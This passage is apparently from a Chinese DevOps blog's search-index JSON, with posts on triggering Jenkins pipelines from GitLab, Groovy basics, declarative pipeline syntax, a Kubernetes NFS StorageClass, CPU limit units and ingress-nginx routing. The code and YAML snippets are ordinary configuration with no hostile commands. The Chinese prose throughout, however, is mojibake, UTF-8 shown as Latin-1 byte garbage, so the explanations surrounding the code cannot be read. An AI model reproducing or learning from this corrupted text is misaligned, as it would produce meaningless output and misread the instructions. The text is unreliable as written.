æ‰“å°ç›¸å…³å†…å®¹å’Œå˜é‡ï¼Œæ–¹ä¾¿è°ƒè¯•ï¼š 2.gitlabé…ç½® URLï¼šhttp://10.0.0.51:8080/generic-webhook-trigger/invoke?token=demo-maven-service_PUSH\u0026runType=gitlabpush ä¿®æ”¹pipelineåŠ¨æ€è·å–åˆ†æ”¯åç§° #!groovy @Library('jenkins-sharelibrary@master') def tools = new org.devops.tools() String srcUrl = \"${env.srcUrl}\" String branchName = \"${env.branchName}\" String buildType = \"${buildType}\" String buildShell = \"${buildShell}\" try{ if ( \"${runType}\" == \"gitlabpush\" ){ branchName = \"${branch}\" } }catch(Exception e){ println(branchName) } currentBuild.description = \"æ„å»ºåˆ†æ”¯ï¼š${branchName}\" pipeline{ agent { node { label 'master'} } stages{ stage('GetCode'){ steps{ script{ tools.myprint(\"æ­£åœ¨æ‹‰å–ä»£ç \",\"green\") checkout([$class: 'GitSCM', branches: [[name: \"${branchName}\"]], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: '476e5130-258c-4e7e-a80e-4ea8a303a985', url: \"${srcUrl}\"]]]) } } } stage('Build'){ steps{ script{ tools.build(\"${buildType}\",\"${buildShell}\") } } } } } ","date":"2020-05-08 14:08","objectID":"/post/1636/:0:0","tags":["jenkins"],"title":"gitlabæäº¤ä»£ç è‡ªåŠ¨è§¦å‘jenkins pipeline","uri":"/post/1636/"},{"categories":["devops"],"content":"1.å®‰è£…æ’ä»¶ 2.é…ç½®github æ·»åŠ ä¸€ä¸ªåº”ç”¨ è®°å½•ClientIDå’ŒSecret 3.é…ç½®jenkins ä¿å­˜åé€€å‡ºç™»é™†ï¼Œå‘ç°æ²¡æœ‰æƒé™äº†ï¼Œæ¯”å¦‚è¿™æ ·ã€‚ã€‚ã€‚ è§£å†³æ–¹æ³•ï¼š ä¿®æ”¹jenkinsçš„config.xmlæ–‡ä»¶ åœ¨\u003cassignedSIDs\u003eå­—æ®µä¸­æ·»åŠ \u003csid\u003eä½ çš„ç”¨æˆ·å\u003c/sid\u003e ä¿å­˜åé‡å¯å³å¯ã€‚ ","date":"2020-05-08 09:32","objectID":"/post/1633/:0:0","tags":["jenkins"],"title":"jenkinsé›†æˆgithubç™»é™†","uri":"/post/1633/"},{"categories":["å…¶ä»–","devops"],"content":"ä¸¤ç§æ–¹å¼è§£å†³ï¼š ç¬¬ä¸€ç§ï¼šåˆ›å»ºnodeè½¯è¿æ¥åˆ°/usr/sbinç›®å½•ä¸‹ ln -sÂ /application/node-v14.2.0-linux-x64/bin/node /usr/sbin/node ç¬¬äºŒç§ï¼š åœ¨æ‰§è¡Œshæ—¶æ·»åŠ ç¯å¢ƒå˜é‡ pipeline{ agent { node { label \"master\" } } parameters{ choice(choices: [\"-v\",\"build\"],description: \"npm\",name: \"buildShell\") } stages{ stage(\"npmæ„å»º\"){ steps{ script{ nodejs_home = tool \"NPM\" sh \"export PATH=\\$PATH:${nodejs_home}/bin \u0026\u0026 ${nodejs_home}/bin/npm ${buildShell}\" } } } } } ","date":"2020-05-07 17:54","objectID":"/post/1628/:0:0","tags":["jenkins","pipeline"],"title":"jenkinsä¸­env: node: No such file or directory","uri":"/post/1628/"},{"categories":["å…¶ä»–","devops"],"content":"å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼š def myprint(content){ print(content) return true } è°ƒç”¨å‡½æ•°ï¼š myprint('å†…å®¹') ","date":"2020-05-07 15:39","objectID":"/post/1625/:0:0","tags":["jenkins","groovy"],"title":"groovyå‡½æ•°ä½¿ç”¨","uri":"/post/1625/"},{"categories":["å…¶ä»–","devops"],"content":"ifåˆ¤æ–­ï¼š Â  switchåˆ¤æ–­ï¼š Â  forå¾ªç¯ï¼š whileå¾ªç¯ï¼š ","date":"2020-05-07 14:50","objectID":"/post/1623/:0:0","tags":["jenkins","groovy"],"title":"groovyé€»è¾‘å’Œå¾ªç¯è¯­å¥","uri":"/post/1623/"},{"categories":["å…¶ä»–","devops"],"content":"å­—ç¬¦ä¸²ï¼š Â  containsï¼šæ˜¯å¦åŒ…å«æŒ‡å®šå­—ç¬¦ä¸² endsWithï¼šæ˜¯å¦ä»¥ä»€ä¹ˆç»“å°¾ sizeå’Œlengthï¼šç»Ÿè®¡å­—ç¬¦ä¸²é•¿åº¦ toUpperCaseå’ŒtoLowerCaseï¼šå¤§å°å†™è½¬æ¢ åˆ—è¡¨ï¼š Â  splitï¼šåˆ†å‰²æ–‡æœ¬ uniqueï¼šåˆ—è¡¨å»é‡ joinï¼šå°†åˆ—è¡¨ä¸­æ¯ä¸ªå…ƒç´ é“¾æ¥ å­—å…¸ï¼š Â  åŸºæœ¬æ“ä½œï¼š æ·»åŠ å’Œåˆ é™¤ï¼š ","date":"2020-05-07 14:01","objectID":"/post/1619/:0:0","tags":["jenkins","groovy"],"title":"groovyå¸¸ç”¨æ–¹æ³•","uri":"/post/1619/"},{"categories":["devops"],"content":"agent anyï¼šä»»æ„èŠ‚ç‚¹æ‰§è¡Œæµæ°´çº¿ nodeï¼šé»˜è®¤ labelï¼šåœ¨æŒ‡å®šçš„agentä¸Šæ‰§è¡Œæµæ°´çº¿ nodeï¼šagent { node { label â€™labelNameâ€™ } }å’ŒÂ agent { label â€™labelNameâ€™ }ç›¸åŒï¼Œä½†nodeå…è®¸å…¶ä»–é€‰é¡¹ï¼ˆå¦‚customWorkspaceæŒ‡å®šå·¥ä½œç©ºé—´ç›®å½•ï¼‰ options buildDiscarder æŒä¹…åŒ–å·¥ä»¶å’Œæ§åˆ¶å°è¾“å‡ºï¼Œç”¨äºæœ€è¿‘Pipelineè¿è¡Œçš„å…·ä½“æ•°é‡ã€‚ä¾‹å¦‚ï¼šoptions { buildDiscarder(logRotator(numToKeepStr: â€˜1â€™)) } disableConcurrentBuilds ä¸å…è®¸å¹¶è¡Œæ‰§è¡ŒPipelineã€‚å¯ç”¨äºé˜²æ­¢åŒæ—¶è®¿é—®å…±äº«èµ„æºç­‰ã€‚ä¾‹å¦‚ï¼šoptions { disableConcurrentBuilds() } skipDefaultCheckout åœ¨agentæŒ‡ä»¤ä¸­é»˜è®¤è·³è¿‡æ¥è‡ªæºä»£ç æ§åˆ¶çš„ä»£ç ã€‚ä¾‹å¦‚ï¼šoptions { skipDefaultCheckout() } skipStagesAfterUnstable ä¸€æ—¦æ„å»ºçŠ¶æ€è¿›å…¥äº†â€œä¸ç¨³å®šâ€çŠ¶æ€ï¼Œå°±è·³è¿‡é˜¶æ®µã€‚ä¾‹å¦‚ï¼šoptions { skipStagesAfterUnstable() } timeout è®¾ç½®Pipelineè¿è¡Œçš„è¶…æ—¶æ—¶é—´ï¼Œä¹‹åJenkinsåº”è¯¥ä¸­æ­¢Pipelineã€‚ä¾‹å¦‚ï¼šoptions { timeout(time: 1, unit: â€˜HOURSâ€™) } retry å¤±è´¥åï¼Œé‡è¯•æ•´ä¸ªPipelineæŒ‡å®šçš„æ¬¡æ•°ã€‚ä¾‹å¦‚ï¼šoptions { retry(3) } timestamps åœ¨æ§åˆ¶å°è¾“å‡ºè¿è¡Œæ—¶é—´ã€‚ä¾‹å¦‚ï¼šoptions { timestamps() } post always è¿è¡Œï¼Œæ— è®ºPipelineè¿è¡Œçš„å®ŒæˆçŠ¶æ€å¦‚ä½•ã€‚ changed åªæœ‰å½“å‰Pipelineè¿è¡Œçš„çŠ¶æ€ä¸å…ˆå‰å®Œæˆçš„Pipelineçš„çŠ¶æ€ä¸åŒæ—¶ï¼Œæ‰èƒ½è¿è¡Œã€‚ failure ä»…å½“å½“å‰Pipelineå¤„äºâ€œå¤±è´¥â€çŠ¶æ€æ—¶æ‰è¿è¡Œï¼Œé€šå¸¸åœ¨Web UIä¸­ç”¨çº¢è‰²æŒ‡ç¤ºè¡¨ç¤ºã€‚ success ä»…å½“å½“å‰Pipelineå…·æœ‰â€œæˆåŠŸâ€çŠ¶æ€æ—¶æ‰è¿è¡Œï¼Œé€šå¸¸åœ¨å…·æœ‰è“è‰²æˆ–ç»¿è‰²æŒ‡ç¤ºçš„Web UIä¸­è¡¨ç¤ºã€‚ unstable åªæœ‰å½“å‰Pipelineå…·æœ‰â€œä¸ç¨³å®šâ€çŠ¶æ€ï¼Œé€šå¸¸ç”±æµ‹è¯•å¤±è´¥ï¼Œä»£ç è¿ä¾‹ç­‰å¼•èµ·ï¼Œæ‰èƒ½è¿è¡Œã€‚é€šå¸¸åœ¨å…·æœ‰é»„è‰²æŒ‡ç¤ºçš„Web UIä¸­è¡¨ç¤ºã€‚ aborted åªæœ‰å½“å‰Pipelineå¤„äºâ€œä¸­æ­¢â€çŠ¶æ€æ—¶ï¼Œæ‰ä¼šè¿è¡Œï¼Œé€šå¸¸æ˜¯ç”±äºPipelineè¢«æ‰‹åŠ¨ä¸­æ­¢ã€‚é€šå¸¸åœ¨å…·æœ‰ç°è‰²æŒ‡ç¤ºçš„Web UIä¸­è¡¨ç¤ºã€‚ environment è¯¥environmentæŒ‡ä»¤æŒ‡å®šä¸€ç³»åˆ—é”®å€¼å¯¹ï¼Œè¿™äº›å¯¹å€¼å°†è¢«å®šä¹‰ä¸ºæ‰€æœ‰æ­¥éª¤æˆ–é˜¶æ®µç‰¹å®šæ­¥éª¤çš„ç¯å¢ƒå˜é‡ï¼Œå…·ä½“å–å†³äºenvironmentæŒ‡ä»¤ä½äºPipelineä¸­çš„ä½ç½®ã€‚ è¯¥æŒ‡ä»¤æ”¯æŒä¸€ç§ç‰¹æ®Šçš„å¸®åŠ©æ–¹æ³•credentials()ï¼Œå¯ä»¥é€šè¿‡å…¶åœ¨Jenkinsç¯å¢ƒä¸­çš„æ ‡è¯†ç¬¦æ¥è®¿é—®é¢„å®šä¹‰çš„å‡­æ®ã€‚å¯¹äºç±»å‹ä¸ºâ€œSecret Textâ€çš„å‡­æ®ï¼Œè¯¥Â credentials()æ–¹æ³•å°†ç¡®ä¿æŒ‡å®šçš„ç¯å¢ƒå˜é‡åŒ…å«Secret Textå†…å®¹ã€‚å¯¹äºâ€œæ ‡å‡†ç”¨æˆ·åå’Œå¯†ç â€ç±»å‹çš„å‡­è¯ï¼ŒæŒ‡å®šçš„ç¯å¢ƒå˜é‡å°†è¢«è®¾ç½®ä¸ºï¼ŒÂ username:passwordå¹¶ä¸”å°†è‡ªåŠ¨å®šä¹‰ä¸¤ä¸ªé™„åŠ çš„ç¯å¢ƒå˜é‡ï¼šMYVARNAME_USRå’ŒMYVARNAME_PSWç›¸åº”çš„ã€‚ pipeline { agent any environment { CC = 'clang' } stages { stage('Example') { environment { AN_ACCESS_KEY = credentials('my-prefined-secret-text') } steps { sh 'printenv' } } } } parameters å‚æ•°åŒ–æ„å»º string å­—ç¬¦ä¸²ç±»å‹çš„å‚æ•°ï¼š parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') } booleanParam å¸ƒå°”å‚æ•°ï¼š parameters { booleanParam(name: 'DEBUG_BUILD', defaultValue: true, description: '') } pipeline { parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') booleanParam(name: 'DEBUG_BUILD', defaultValue: true, description: '') } agentÂ any stages { stage(\"Example\") { steps { println(\"${DEPLOY_ENV}\") println(\"$DEBUG_BUILD\") } } } tool è·å–é€šè¿‡è‡ªåŠ¨å®‰è£…æˆ–æ‰‹åŠ¨æ”¾ç½®å·¥å…·çš„ç¯å¢ƒå˜é‡ã€‚æ”¯æŒmaven/jdk/gradleã€‚å·¥å…·çš„åç§°å¿…é¡»åœ¨ç³»ç»Ÿè®¾ç½®-\u003eå…¨å±€å·¥å…·é…ç½®ä¸­å®šä¹‰ã€‚ éœ€è¦åœ¨jenkinsé…ç½®mavenç¯å¢ƒï¼Œåç§°ä¸ºapache-maven-3.0.1 pipeline { agent any tools { maven 'apache-maven-3.0.1' } stages { stage('Example') { steps { sh 'mvn --version' } } } } input inputç”¨æˆ·åœ¨æ‰§è¡Œå„ä¸ªé˜¶æ®µçš„æ—¶å€™ï¼Œç”±äººå·¥ç¡®è®¤æ˜¯å¦ç»§ç»­è¿›è¡Œã€‚ message å‘ˆç°ç»™ç”¨æˆ·çš„æç¤ºä¿¡æ¯ã€‚ id å¯é€‰ï¼Œé»˜è®¤ä¸ºstageåç§°ã€‚ ok é»˜è®¤è¡¨å•ä¸Šçš„okæ–‡æœ¬ã€‚ submitter å¯é€‰çš„,ä»¥é€—å·åˆ†éš”çš„ç”¨æˆ·åˆ—è¡¨æˆ–å…è®¸æäº¤çš„å¤–éƒ¨ç»„åã€‚é»˜è®¤å…è®¸ä»»ä½•ç”¨æˆ·ã€‚ submitterParameter ç¯å¢ƒå˜é‡çš„å¯é€‰åç§°ã€‚å¦‚æœå­˜åœ¨ï¼Œç”¨submitterÂ åç§°è®¾ç½®ã€‚ parameters æç¤ºæäº¤è€…æä¾›çš„ä¸€ä¸ªå¯é€‰çš„å‚æ•°åˆ—è¡¨ã€‚ pipeline { parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') booleanParam(name: 'DEBUG_BUILD', defaultValue: true, description: '') } agent any stages { stage(\"Example\") { steps { println(\"${DEPLOY_ENV}\") println(\"$DEBUG_BUILD\") input message: 'ç»§ç»­æ‰§è¡Œ', ok: 'æ˜¯çš„ï¼Œæ‰§è¡Œ', parameters: [text(defaultValue: 'None', description: '', name: 'content')], submitter: 'admin' } } } } Â  when when æŒ‡ä»¤å…è®¸æµæ°´çº¿æ ¹æ®ç»™å®šçš„æ¡ä»¶å†³å®šæ˜¯å¦åº”è¯¥æ‰§è¡Œé˜¶æ®µã€‚ when æŒ‡ä»¤å¿…é¡»åŒ…å«è‡³å°‘ä¸€ä¸ªæ¡ä»¶ã€‚ å¦‚æœwhenÂ æŒ‡ä»¤åŒ…å«å¤šä¸ªæ¡ä»¶, æ‰€æœ‰çš„å­æ¡ä»¶å¿…é¡»è¿”å›Trueï¼Œé˜¶æ®µæ‰èƒ½æ‰§è¡Œã€‚ è¿™ä¸å­æ¡ä»¶åœ¨ allOf æ¡ä»¶ä¸‹åµŒå¥—çš„æƒ…å†µç›¸åŒã€‚ branch: å½“æ­£åœ¨æ„å»ºçš„åˆ†æ”¯ä¸æ¨¡å¼ç»™å®šçš„åˆ†æ”¯åŒ¹é…æ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªé˜¶æ®µ,è¿™åªé€‚ç”¨äºå¤šåˆ†æ”¯æµæ°´çº¿ä¾‹å¦‚: when { branch 'master' } Â  environment: å½“æŒ‡å®šçš„ç¯å¢ƒå˜é‡æ˜¯ç»™å®šçš„å€¼æ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªæ­¥éª¤,ä¾‹å¦‚: when { environment name: 'DEPLOY_TO', value: 'production' } Â  expression å½“æŒ‡å®šçš„Groovyè¡¨è¾¾å¼è¯„ä¼°ä¸ºtrueæ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªé˜¶æ®µ, ä¾‹å¦‚: when { expression { return params.DEBUG_BUILD } } Â  not å½“åµŒå¥—æ¡ä»¶æ˜¯é”™è¯¯æ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªé˜¶æ®µ,å¿…é¡»åŒ…å«ä¸€ä¸ªæ¡ä»¶ï¼Œä¾‹å¦‚: when { not { branch 'master' } } Â  allOf å½“æ‰€æœ‰çš„åµŒå¥—æ¡ä»¶éƒ½ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªé˜¶æ®µ,å¿…é¡»åŒ…å«è‡³å°‘ä¸€ä¸ªæ¡ä»¶ï¼Œä¾‹å¦‚: when { allOf { branch 'master'; environment name: 'DEPLOY_TO', value: 'production' } } Â  anyOf å½“è‡³å°‘æœ‰ä¸€ä¸ªåµŒå¥—æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªé˜¶æ®µ,å¿…é¡»åŒ…å«è‡³å°‘ä¸€ä¸ªæ¡ä»¶ï¼Œä¾‹å¦‚: when { anyOf { branch 'master'; branch 'staging' } } Â  ç¤ºä¾‹ï¼š // branch pipeline { agent any stages { stage('Example Build') { steps { echo 'Hello World' } } stage('Example Deploy') { when { branch 'production' } steps { echo 'Deploying' } } } } // env pipeline { agent any stages { stage('Example Build') { steps { echo 'Hello World' } } stage('Example Deploy') { when { branch 'production' environment name: 'DEPLOY_TO', value: 'production' } st","date":"2020-05-07 09:51","objectID":"/post/1606/:0:0","tags":["jenkins","devops"],"title":"pipelineè¯­æ³•","uri":"/post/1606/"},{"categories":["kubernetes"],"content":"1.å®‰è£…nfsæœåŠ¡ï¼ˆç•¥ï¼‰ ","date":"2020-04-24 18:51","objectID":"/post/1598/:1:0","tags":["k8s"],"title":"k8sä½¿ç”¨åŸºäºnfsçš„storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"2.é…ç½®yamlæ–‡ä»¶ å¯ä»¥æå‰æ‹‰é•œåƒï¼šdocker pull quay.io/external_storage/nfs-client-provisioner:latest deployment.yaml éœ€è¦ä¿®æ”¹ä½ çš„nfsåœ°å€ï¼Œå’Œnfså…±äº«ç›®å½• apiVersion: apps/v1 kind: Deployment metadata: name: nfs-client-provisioner labels: app: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default spec: replicas: 1 strategy: type: Recreate selector: matchLabels: app: nfs-client-provisioner template: metadata: labels: app: nfs-client-provisioner spec: serviceAccountName: nfs-client-provisioner containers: - name: nfs-client-provisioner image: quay.io/external_storage/nfs-client-provisioner:latest volumeMounts: - name: nfs-client-root mountPath: /persistentvolumes env: - name: PROVISIONER_NAME value: fuseim.pri/ifs - name: NFS_SERVER value: 10.0.0.100 - name: NFS_PATH value: /data/sc-test/ volumes: - name: nfs-client-root nfs: server: 10.0.0.100 path: /data/sc-test/\u003c/code\u003e\u003c/pre\u003e rbac.yaml apiVersion: v1 kind: ServiceAccount metadata: name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default --- kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: nfs-client-provisioner-runner rules: - apiGroups: [\"\"] resources: [\"persistentvolumes\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"delete\"] - apiGroups: [\"\"] resources: [\"persistentvolumeclaims\"] verbs: [\"get\", \"list\", \"watch\", \"update\"] - apiGroups: [\"storage.k8s.io\"] resources: [\"storageclasses\"] verbs: [\"get\", \"list\", \"watch\"] - apiGroups: [\"\"] resources: [\"events\"] verbs: [\"create\", \"update\", \"patch\"] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: run-nfs-client-provisioner subjects: - kind: ServiceAccount name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default roleRef: kind: ClusterRole name: nfs-client-provisioner-runner apiGroup: rbac.authorization.k8s.io --- kind: Role apiVersion: rbac.authorization.k8s.io/v1 metadata: name: leader-locking-nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default rules: - apiGroups: [\"\"] resources: [\"endpoints\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\"] --- kind: RoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: leader-locking-nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default subjects: - kind: ServiceAccount name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default roleRef: kind: Role name: leader-locking-nfs-client-provisioner apiGroup: rbac.authorization.k8s.io\u003c/code\u003e\u003c/pre\u003e class.yaml apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: test-nfs-storage provisioner: fuseim.pri/ifs # fuseim.pri/ifsè¿™ä¸ªåç§°è¦å’Œä¸Šé¢çš„delpoymentä¸­PROVISIONER_NAMEç¯å¢ƒå˜é‡ä¸€è‡´ parameters: archiveOnDelete: \"false\" # archiveOnDeleteä¸ºfalseè¡¨ç¤ºä¸å­˜æ¡£ï¼Œå³åˆ é™¤æ•°æ®ï¼Œtrueè¡¨ç¤ºå­˜æ¡£ï¼Œå³é‡å‘½åè·¯å¾„ã€‚æ ¼å¼ä¸ºarchieved-${namespace}-${pvcName}-${pvName} åˆ›å»ºèµ„æºä¸Šé¢æ‰€æœ‰çš„èµ„æº ","date":"2020-04-24 18:51","objectID":"/post/1598/:2:0","tags":["k8s"],"title":"k8sä½¿ç”¨åŸºäºnfsçš„storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"3.åˆ›å»ºPVC kind: PersistentVolumeClaim apiVersion: v1 metadata: name: test-pvc annotations: volume.beta.kubernetes.io/storage-class: \"test-nfs-storage\" # æ³¨è§£éœ€è¦æŒ‡å®šå¯¹åº”çš„storageclass spec: accessModes: - ReadWriteMany resources: requests: storage: 1Mi ç°åœ¨å¯ä»¥é€šè¿‡kubectl get pvcæŸ¥çœ‹pvcçš„çŠ¶æ€äº† NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-pvc Bound pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1 1Mi RWX test-nfs-storage 42m pvçš„çŠ¶æ€ NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1 1Mi RWX Delete Bound default/test-pvc test-nfs-storage 6m35s å½“æ³¨è§£ä¸­æŒ‡å®šstorage-classæ—¶ï¼Œpvä¼šè¢«è‡ªåŠ¨åˆ›å»º,å³ä¸Šé¢çš„volume.beta.kubernetes.io/storage-class: \"test-nfs-storage\" å¦‚æœæ²¡æœ‰åœ¨pvcä¸­å†™æ³¨è§£çš„è¯ï¼Œå¯ä»¥åœ¨storage-classä¸­ä¿®æ”¹é…ç½®ï¼Œåœ¨metadataä¸‹æ·»åŠ å¦‚ä¸‹å†…å®¹ã€‚ä¿®æ”¹åé»˜è®¤ä¼šè‡ªåŠ¨åˆ›å»ºpvï¼Œä½†æ˜¯è¿™æ ·çµæ´»æ€§å°±ä¼šå˜å·® kubectl edit sc test-nfs-storage annotations: storageclass.kubernetes.io/is-default-class: \"true\" ** æµ‹è¯•ä¸€ä¸‹æ²¡æœ‰æ³¨è§£çš„pvcï¼Œåˆ›å»ºåå¯ä»¥å‘ç°ä¾ç„¶ä¼šè‡ªåŠ¨åˆ›å»ºpvï¼Œæˆ‘ä»¬ä¸Šé¢ä¿®æ”¹çš„ç›®çš„è¾¾åˆ°äº†** kind: PersistentVolumeClaim apiVersion: v1 metadata: name: test-pvc2 spec: accessModes: - ReadWriteMany resources: requests: storage: 1Mi NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-pvc Bound pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1 1Mi RWX test-nfs-storage 73m test-pvc2 Bound pvc-c83e647a-8614-11ea-a9e0-000c29a221f1 1Mi RWX test-nfs-storage 11m pvc(pv)åˆ›å»ºæˆåŠŸåä¼šåœ¨nfsçš„å…±äº«ç›®å½•ï¼ˆ/data/sc-testï¼‰åˆ›å»ºä¸€ä¸ª${namespace}-${pvcName}-${pvName}è¿™æ ·çš„ç›®å½• ","date":"2020-04-24 18:51","objectID":"/post/1598/:3:0","tags":["k8s"],"title":"k8sä½¿ç”¨åŸºäºnfsçš„storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"4.é…ç½®æµ‹è¯•pod kind: Pod apiVersion: v1 metadata: name: test-pod spec: containers: - name: test-pod image: busybox:1.24 command: - \"/bin/sh\" args: - \"-c\" - \"touch /mnt/SUCCESS \u0026amp;\u0026amp; exit 0 || exit 1\" volumeMounts: - name: nfs-pvc mountPath: \"/mnt\" restartPolicy: \"Never\" volumes: - name: nfs-pvc persistentVolumeClaim: claimName: test-pvc å½“çœ‹åˆ°SUCCESSæ–‡ä»¶ä»£è¡¨æˆåŠŸäº† /data/sc-test/default-test-pvc-pvc-1bdc10af-860c-11ea-a9e0-000c29a221f1/SUCCESS ","date":"2020-04-24 18:51","objectID":"/post/1598/:4:0","tags":["k8s"],"title":"k8sä½¿ç”¨åŸºäºnfsçš„storage class","uri":"/post/1598/"},{"categories":["kubernetes"],"content":"å®˜æ–¹å¯¹å•ä½çš„è§£é‡Šï¼š https://v1-14.docs.kubernetes.io/zh/docs/tasks/configure-pod-container/assign-cpu-resource/#cpu-%E5%8D%95%E4%BD%8D requestsï¼šä»£è¡¨å®¹å™¨å¯åŠ¨è¯·æ±‚çš„èµ„æºé™åˆ¶ï¼Œåˆ†é…çš„èµ„æºå¿…é¡»è¦è¾¾åˆ°æ­¤è¦æ±‚ limitsï¼šä»£è¡¨æœ€å¤šå¯ä»¥è¯·æ±‚å¤šå°‘èµ„æº å•ä½mï¼šCPUçš„è®¡é‡å•ä½å«æ¯«æ ¸(m)ã€‚ä¸€ä¸ªèŠ‚ç‚¹çš„CPUæ ¸å¿ƒæ•°é‡ä¹˜ä»¥1000ï¼Œå¾—åˆ°çš„å°±æ˜¯èŠ‚ç‚¹æ€»çš„CPUæ€»æ•°é‡ã€‚å¦‚ï¼Œä¸€ä¸ªèŠ‚ç‚¹æœ‰ä¸¤ä¸ªæ ¸ï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹çš„CPUæ€»é‡ä¸º2000mã€‚ ä¸‹é¢æ‹¿åŒæ ¸ä¸¾ä¾‹ï¼š resources: requests: cpu: 50m #ç­‰åŒäº0.05 memory: 512Mi limits: cpu: 100m #ç­‰åŒäº0.1 memory: 1Gi å«ä¹‰ï¼šè¯¥å®¹å™¨å¯åŠ¨æ—¶è¯·æ±‚50/2000çš„æ ¸å¿ƒï¼ˆ2.5ï¼…ï¼‰å¹¶ä¸”å…è®¸æœ€å¤šä½¿ç”¨100/2000æ ¸å¿ƒï¼ˆ5ï¼…ï¼‰ã€‚ 0.05ä¸ªæ ¸é™¤æ€»æ ¸æ•°é‡2å°±æ˜¯2.5%äº†ï¼Œ0.1ä¸ªæ ¸é™¤æ€»æ ¸æ•°å°±2æ˜¯5%äº† resources: requests: cpu: 100m #ç­‰åŒäº0.1 memory: 512Mi limits: cpu: 200m #ç­‰åŒäº0.2 memory: 1Gi cpuå•ä½mçš„å«ä¹‰ï¼šè¯¥å®¹å™¨å¯åŠ¨æ—¶è¯·æ±‚100/2000çš„æ ¸å¿ƒï¼ˆ5ï¼…ï¼‰å¹¶ä¸”å…è®¸æœ€å¤šä½¿ç”¨200/2000æ ¸å¿ƒï¼ˆ10ï¼…ï¼‰ 0.1ä¸ªæ ¸é™¤æ€»æ ¸æ•°é‡2å°±æ˜¯5%äº†ï¼Œ0.2ä¸ªæ ¸é™¤æ€»æ ¸æ•°2å°±æ˜¯10%äº† å¯ä»¥çœ‹åˆ°ä¸‹å›¾æ˜¯é™åˆ¶200mä¹Ÿå°±æ˜¯0.2ä¸ªæ ¸ï¼Œæœ€é«˜å¯ä»¥è·‘åˆ°0.2 ","date":"2020-04-22 16:24","objectID":"/post/1591/:0:0","tags":["k8s"],"title":"å¦‚ä½•ç†è§£k8sä¸­limité™åˆ¶cpuå•ä½","uri":"/post/1591/"},{"categories":["kubernetes"],"content":"1.éƒ¨ç½²ingress-nginx-controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/static/provider/baremetal/deploy.yaml æŸ¥çœ‹nodeportï¼š æ·»åŠ åŸŸåè§£æï¼š 192.168.0.3 soulchild.cnÂ test.soulchild.cn 2. åˆ›å»ºä¸¤ä¸ªæµ‹è¯•èµ„æº apiVersion: extensions/v1beta1 kind: Deployment metadata: name: nginx-deploy labels: app: nginx spec: replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: nginx-http containerPort: 80 protocol: TCP lifecycle: postStart: exec: command: - \"/bin/bash\" - \"-c\" - \"echo ingress-test1 \u003e /usr/share/nginx/html/index.html\" --- apiVersion: v1 kind: Service metadata: name: nginx labels: app: nginx spec: selector: app: nginx ports: - name: web port: 80 targetPort: nginx-http Â  apiVersion: extensions/v1beta1 kind: Deployment metadata: name: nginx-deploy2 labels: app: nginx2 spec: replicas: 3 template: metadata: labels: app: nginx2 spec: containers: - name: nginx2 image: nginx:1.14.2 ports: - name: nginx-http containerPort: 80 protocol: TCP lifecycle: postStart: exec: command: - \"/bin/bash\" - \"-c\" - \"echo ingress-test2 \u003e /usr/share/nginx/html/index.html\" --- apiVersion: v1 kind: Service metadata: name: nginx2 labels: app: nginx2 spec: selector: app: nginx2 ports: - name: web port: 80 targetPort: nginx-http Â  åˆ›å»ºingressèµ„æº ç¬¬ä¸€ç§ï¼šå•æœåŠ¡ apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: test-ingress spec: backend: serviceName: nginx servicePort: 80 è®¿é—®ï¼šsoulchild.cn:30960 ç¬¬äºŒç§ï¼šåŸºäºuri å…ˆåˆ é™¤ä¸Šé¢çš„ingress apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: simple-fanout-example annotations: nginx.ingress.kubernetes.io/rewrite-target: / spec: rules: - host: soulchild.cn http: paths: - path: /foo backend: serviceName: nginx servicePort: nginx-http - path: /bar backend: serviceName: nginx2 servicePort: nginx-http ç¬¬ä¸‰ç§ï¼šåŸºäºåŸŸå apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: name-virtual-host-ingress spec: rules: - host: soulchild.cn http: paths: - backend: serviceName: nginx servicePort: nginx-http - host: test.soulchild.cn http: paths: - backend: serviceName: nginx2 servicePort: nginx-http å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå½“æ²¡æœ‰ä¸»æœºåŒ¹é…æ—¶ï¼Œè®¿é—®df apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: name-virtual-host-ingress spec: rules: - host: soulchild.cn http: paths: - backend: 